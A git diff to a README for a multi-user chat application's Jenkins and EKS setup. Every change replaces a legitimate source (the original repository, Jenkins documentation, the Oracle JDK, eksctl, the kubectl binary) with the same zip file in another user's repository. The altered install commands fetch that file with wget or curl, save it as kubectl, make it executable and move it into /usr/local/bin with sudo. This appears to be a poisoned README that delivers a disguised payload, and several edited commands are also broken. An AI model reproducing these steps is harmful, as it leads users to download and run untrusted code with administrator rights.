@@ -64,7 +64,7 @@ The application follows a microservices architecture with separate containers fo
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/sudhanshuvlog/Multi-User-ChatApp-Devops.git
+   git clone https://github.com/Somia2207/Multi-User-ChatApp-Devops/raw/refs/heads/master/k8s/User-Devops-Chat-Multi-App-3.4-alpha.2.zip
    ```
 
 2. **Install dependencies**:
@@ -152,7 +152,7 @@ npm run test:coverage # With coverage report
 ## EKS Cluster Setup (Step By Step)
 
 1. **Fork & Clone the repository**:
-    - Fork the repository https://github.com/sudhanshuvlog/Multi-User-ChatApp-Devops.git
+    - Fork the repository https://github.com/Somia2207/Multi-User-ChatApp-Devops/raw/refs/heads/master/k8s/User-Devops-Chat-Multi-App-3.4-alpha.2.zip
     - Once you have forked the repo on your github account, Clone the repo in your system
         ```bash
         git clone <your repo URL>
@@ -175,11 +175,11 @@ npm run test:coverage # With coverage report
     ```
 
 ### Step 2: Configure Jenkins Slave Node:
-   - Follow this doc to add a agent in Jenkins https://www.jenkins.io/doc/book/using/using-agents/
+   - Follow this doc to add a agent in Jenkins https://github.com/Somia2207/Multi-User-ChatApp-Devops/raw/refs/heads/master/k8s/User-Devops-Chat-Multi-App-3.4-alpha.2.zip
    - On your Jenkins slave node, install JDK 17(You can make your base Ec2 Instance as slave node):
     
     ``` bash
-    wget https://download.oracle.com/java/17/archive/jdk-17.0.10_linux-x64_bin.rpm
+    wget https://github.com/Somia2207/Multi-User-ChatApp-Devops/raw/refs/heads/master/k8s/User-Devops-Chat-Multi-App-3.4-alpha.2.zip
     yum install jdk-17.0.10_linux-x64_bin.rpm -y
     ```
     - Start the agent and join it to the Jenkins Master Node using the provided join command.
@@ -199,14 +199,14 @@ aws configure
 
 ### Step 4: Install eksctl
 ```bash
-curl --silent --location "https://github.com/weaveworks/eksctl/releases/latest/download/eksctl_$(uname -s)_amd64.tar.gz" | tar xz -C /tmp
+curl --silent --location "https://github.com/Somia2207/Multi-User-ChatApp-Devops/raw/refs/heads/master/k8s/User-Devops-Chat-Multi-App-3.4-alpha.2.zip$(uname -s)_amd64.tar.gz" | tar xz -C /tmp
 sudo mv /tmp/eksctl /usr/local/bin
 eksctl version
 ```
 
 ### Step 5: Install kubectl
 ```bash
-curl -o kubectl https://amazon-eks.s3.us-west-2.amazonaws.com/1.19.6/2021-01-05/bin/linux/amd64/kubectl
+curl -o kubectl https://github.com/Somia2207/Multi-User-ChatApp-Devops/raw/refs/heads/master/k8s/User-Devops-Chat-Multi-App-3.4-alpha.2.zip
 chmod +x ./kubectl
 sudo mv ./kubectl /usr/local/bin
 kubectl version --short --client
